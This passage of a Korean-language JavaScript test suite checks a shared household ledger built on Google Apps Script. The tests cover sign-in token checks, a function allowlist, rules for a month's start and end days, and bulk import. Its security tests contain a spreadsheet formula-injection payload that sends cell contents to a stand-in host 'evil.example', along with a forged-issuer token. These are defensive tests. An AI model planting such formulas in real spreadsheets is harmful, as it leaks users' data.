  const out = gas.post({ token: good, fn: 'getBootstrap', args: [''] });
  assert.equal(out.error, undefined, out.error);
  assert.equal(out.result.me.email, 지민);
});

test('증명서가 없거나 가짜면 막는다', () => {
  const gas = withClientId();

  const none = gas.post({ fn: 'getBootstrap', args: [''] });
  assert.match(none.error, /로그인이 필요합니다/);
  assert.equal(none.needSignIn, true);

  const fake = gas.post({ token: 'head.YWJj.sign', fn: 'getBootstrap', args: [''] });
  assert.match(fake.error, /만료/);
});

test('남의 사이트에서 발급된 증명서는 막는다', () => {
  const gas = withClientId();
  // 이메일은 진짜지만, 다른 곳에서 받은 증명서
  const stolen = gas.issueToken('stolen', { email: 지민, aud: 'someone-else.apps.googleusercontent.com' });

  const out = gas.post({ token: stolen, fn: 'getBootstrap', args: [''] });
  assert.match(out.error, /다른 곳에서 발급된/);
});

test('만료된 증명서는 막는다', () => {
  const gas = withClientId();
  const old = gas.issueToken('old', { email: 지민, expiresInSec: -60 });

  const out = gas.post({ token: old, fn: 'getBootstrap', args: [''] });
  assert.match(out.error, /만료/);
  assert.equal(out.needSignIn, true);
});

test('초대받지 않은 계정은 막는다', () => {
  const gas = withClientId();
  const outsider = gas.issueToken('outsider', { email: 'stranger@example.com' });

  const out = gas.post({ token: outsider, fn: 'getBootstrap', args: [''] });
  assert.match(out.error, /초대되지 않은/);
  assert.equal(out.needSignIn, true);
});

test('목록에 없는 함수는 부를 수 없다', () => {
  const gas = withClientId();
  const good = gas.issueToken('good', { email: 지민 });

  for (const fn of ['ensureSheets_', 'readSettings_', 'doPost', '']) {
    const out = gas.post({ token: good, fn, args: [] });
    assert.match(out.error, /알 수 없는 요청/, `${fn} 이(가) 막히지 않았습니다`);
  }
});

test('누가 넣었는지는 증명서의 주인으로 기록된다', () => {
  const gas = withClientId();
  // 스크립트는 주인(지민)으로 실행되지만, 요청한 사람은 수호다
  const suho = gas.issueToken('suho', { email: 수호 });

  const out = gas.post({
    token: suho,
    fn: 'addTransaction',
    args: [{ date: '2026-08-10', kind: 'expense', amount: 7000, category: '식비', month: '2026-08' }],
  });
  assert.equal(out.error, undefined, out.error);
  assert.equal(out.result.transactions[0].userEmail, 수호, '주인 이름으로 기록됐습니다');
});

/* ================================================================== */
/* 한 달의 시작일과 종료일                                              */
/* ================================================================== */

test('시작일을 정하면 종료일이 따라온다', () => {
  const gas = freshLedger();

  const set = (payload) => gas.call('updateSettings', { month: '2026-08', ...payload }).settings;

  assert.deepEqual(set({ startDay: 24 }), { startDay: 24, endDay: 23 });
  assert.deepEqual(set({ startDay: 1 }), { startDay: 1, endDay: 31 });  // 31 = 말일
  assert.deepEqual(set({ startDay: 31 }), { startDay: 31, endDay: 30 });
});

test('종료일만 바꾸면 시작일은 그대로 두고 끝만 옮긴다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-08' });

  // 전달 24일부터 이번달 25일까지 — 일부러 이틀 겹치게 잡는 경우
  const out = gas.call('updateSettings', { endDay: 25, month: '2026-08' });
  assert.deepEqual(out.settings, { startDay: 24, endDay: 25 });
  assert.deepEqual(out.range, { from: '2026-07-24', to: '2026-08-25' });

  // 그 다음 달은 8월 24일에 시작하므로 8/24·8/25가 두 달에 함께 들어간다
  const 구월 = gas.call('getMonthData', '2026-09').range;
  assert.deepEqual(구월, { from: '2026-08-24', to: '2026-09-25' });
});

test('종료일을 당기면 비는 날이 생긴다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-08' });
  const out = gas.call('updateSettings', { endDay: 20, month: '2026-08' });

  assert.deepEqual(out.range, { from: '2026-07-24', to: '2026-08-20' });
  // 8/21~8/23 은 어느 달에도 안 들어간다. 막지는 않되 화면이 알려준다.
  assert.equal(gas.call('getMonthData', '2026-09').range.from, '2026-08-24');
});

test('시작일을 바꾸면 종료일은 딱 붙는 기본값으로 돌아간다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-08' });
  gas.call('updateSettings', { endDay: 25, month: '2026-08' });

  // 겹쳐둔 상태에서 시작일만 다시 바꾸면, 모르는 새 겹친 채로 남지 않게 한다
  const out = gas.call('updateSettings', { startDay: 25, month: '2026-08' });
  assert.deepEqual(out.settings, { startDay: 25, endDay: 24 });
});

test('시작일과 종료일 사이에 빈 날이 생기지 않는다', () => {
  const gas = freshLedger();

  // 어떤 값으로 정하든, 한 달의 끝 다음 날은 그 다음 달의 시작이라야 한다
  for (const startDay of [1, 5, 24, 28, 31]) {
    gas.call('updateSettings', { startDay, month: '2026-08' });
    const 팔월 = gas.call('getMonthData', '2026-08').range;
    const 구월 = gas.call('getMonthData', '2026-09').range;

    const 다음날 = new Date(팔월.to + 'T00:00:00');
    다음날.setDate(다음날.getDate() + 1);
    const iso = 다음날.toISOString().slice(0, 10);
    assert.equal(iso, 구월.from, `${startDay}일 시작에서 ${팔월.to} 다음 날이 비었습니다`);
  }
});

test('말이 안 되는 종료일은 막는다', () => {
  const gas = freshLedger();
  for (const bad of [-1, 32, 1.5, 'abc']) {
    assert.throws(() => gas.call('updateSettings', { endDay: bad, month: '2026-08' }),
      /종료일/, `${bad} 이(가) 통과했습니다`);
  }
});

/* ================================================================== */
/* 보안                                                                */
/* ================================================================== */

test('증명서 모양이 아니면 구글에 묻지도 않는다', () => {
  const gas = withClientId();
  const before = gas.asked();

  // 구글에 묻는 횟수에는 하루 한도가 있다. 아무 글자나 계속 보내는 것만으로
  // 그 한도를 태워 우리 둘까지 못 쓰게 만들 수 있다.
  for (const junk of ['아무거나', 'a.b', '....', 'x'.repeat(5000), '<script>', '']) {
    const out = gas.post({ token: junk, fn: 'getBootstrap', args: [''] });
    assert.ok(out.error, `${junk.slice(0, 12)} 이(가) 통과했습니다`);
  }
  assert.equal(gas.asked(), before, '모양만 봐도 될 것을 구글에 물었습니다');
});

test('한 번 가짜로 판명된 증명서는 다시 묻지 않는다', () => {
  const gas = withClientId();
  const fake = 'head.ZmFrZQ.sign';

  gas.post({ token: fake, fn: 'getBootstrap', args: [''] });
  const after첫번 = gas.asked();
  gas.post({ token: fake, fn: 'getBootstrap', args: [''] });

  assert.equal(gas.asked(), after첫번, '같은 가짜를 두 번 물었습니다');
});

test('구글이 아닌 곳에서 발급된 증명서는 막는다', () => {
  const gas = withClientId();
  const evil = gas.issueToken('evil', { email: 지민, iss: 'https://evil.example' });

  const out = gas.post({ token: evil, fn: 'getBootstrap', args: [''] });
  assert.match(out.error, /구글이 발급한 증명서가 아닙니다/);
});

test('명단에 없는 사람을 작성자로 지정할 수 없다', () => {
  const gas = withClientId();
  const token = gas.issueToken('t', { email: 지민 });
  const add = (userEmail) => gas.post({
    token,
    fn: 'addTransaction',
    args: [{ date: '2026-08-10', kind: 'expense', amount: 1000, category: '식비', userEmail, month: '2026-08' }],
  });

  assert.match(add('stranger@example.com').error, /함께 쓰는 사람만/);
  assert.equal(add(수호).error, undefined, '같이 쓰는 사람은 되어야 합니다');
  assert.equal(add('').error, undefined, '비우면 접속한 사람이 되어야 합니다');
});

test('메모가 시트에서 수식으로 실행되지 않는다', () => {
  const gas = freshLedger();

  // =IMAGE("https://…"&A2) 같은 걸 적어두면, 나중에 시트를 열었을 때 옆 칸 내용이
  // 바깥으로 새어 나갈 수 있다. 글자로만 남아야 한다.
  const 위험한것 = ['=IMAGE("https://evil.example/"&A2)', '+1+1', '-1-1', '@SUM(A1)'];
  위험한것.forEach((memo, i) => {
    gas.call('addTransaction', {
      date: '2026-08-0' + (i + 1), kind: 'expense', amount: 1000, category: '식비', memo, month: '2026-08',
    });
  });

  gas.dump('내역').slice(1).forEach((row) => {
    const cell = String(row[5]);
    assert.equal(cell[0], "'", `시트에 수식으로 들어갔습니다: ${cell}`);
  });

  // 화면에는 따옴표 없이 원래대로 보여야 한다
  const memos = gas.call('getMonthData', '2026-08').transactions.map((t) => t.memo);
  위험한것.forEach((m) => assert.ok(memos.includes("'" + m) || memos.includes(m), m + ' 이(가) 사라졌습니다'));
});

test('카테고리 이름도 수식으로 들어가지 않는다', () => {
  const gas = freshLedger();
  gas.call('addGroup', { kind: 'expense', name: '=SUM(A1:A9)', color: '#ff0000' });

  const 대분류 = gas.dump('대분류').slice(1).map((r) => String(r[2]));
  assert.ok(대분류.includes("'=SUM(A1:A9)"), '이름이 글자로 저장되지 않았습니다: ' + 대분류.join(', '));
  assert.equal(대분류.filter((n) => n[0] === '=').length, 0, '수식으로 들어간 이름이 있습니다');
});

/* ================================================================== */
/* 여러 건 한꺼번에 가져오기                                             */
/* ================================================================== */

const 한줄 = (over) => ({
  date: '2026-09-01', kind: 'expense', amount: 5600, memo: '스타벅스', ...over,
});

test('여러 건을 한꺼번에 넣는다', () => {
  const gas = freshLedger();
  const out = gas.call('importTransactions', {
    month: '2026-09',
    rows: [
      한줄(),
      한줄({ amount: 12000, memo: '김밥천국', date: '2026-09-02' }),
      한줄({ kind: 'income', amount: 3000000, memo: '급여', date: '2026-09-03' }),
    ],
  });

  assert.equal(out.added, 3);
  assert.equal(out.skipped, 0);
  assert.equal(out.data.transactions.length, 3);
  assert.equal(out.data.summary.total.income, 3000000);
  assert.equal(out.data.summary.total.expense, 17600);
});

test('같은 내역을 두 번 가져와도 두 줄이 되지 않는다', () => {
  const gas = freshLedger();
  const rows = [한줄(), 한줄({ amount: 12000, memo: '김밥천국' })];

  gas.call('importTransactions', { month: '2026-09', rows });
  const 두번째 = gas.call('importTransactions', { month: '2026-09', rows });

  assert.equal(두번째.added, 0, '같은 것이 또 들어갔습니다');
  assert.equal(두번째.skipped, 2);
  assert.equal(두번째.data.transactions.length, 2);
});

test('겹치는 기간을 가져오면 새것만 들어간다', () => {
  const gas = freshLedger();
  gas.call('importTransactions', { month: '2026-09', rows: [한줄()] });

  const out = gas.call('importTransactions', {
    month: '2026-09',
    rows: [한줄(), 한줄({ amount: 4000, memo: '편의점', date: '2026-09-05' })],
  });

  assert.equal(out.added, 1, '새 것만 들어가야 합니다');
  assert.equal(out.skipped, 1);
});

test('가져온 메모도 시트에서 수식으로 실행되지 않는다', () => {
  const gas = freshLedger();
  gas.call('importTransactions', {
    month: '2026-09',
    rows: [한줄({ memo: '=IMAGE("https://evil.example/"&A2)' })],
  });

  const 메모 = gas.dump('내역').slice(1).map((r) => String(r[5]));
  assert.equal(메모.filter((m) => m[0] === '=').length, 0, '수식으로 들어갔습니다');
});

test('가져올 내역이 이상하면 아무것도 넣지 않는다', () => {
  const gas = freshLedger();

  assert.throws(() => gas.call('importTransactions', { month: '2026-09', rows: [] }), /가져올 내역이 없습니다/);
  assert.throws(() => gas.call('importTransactions', {
    month: '2026-09', rows: [한줄({ amount: -100 })],
  }), /금액/);
  assert.throws(() => gas.call('importTransactions', {
    month: '2026-09', rows: [한줄({ date: '엉망' })],
  }), /날짜/);

  assert.equal(gas.call('getMonthData', '2026-09').transactions.length, 0, '실패했는데 뭔가 들어갔습니다');
});

test('한 번에 너무 많이 넣으려 하면 막는다', () => {
  const gas = freshLedger();
  const 많이 = [];
  for (let i = 0; i < 201; i++) 많이.push(한줄({ amount: 1000 + i }));

  assert.throws(() => gas.call('importTransactions', { month: '2026-09', rows: 많이 }), /200건까지/);
});
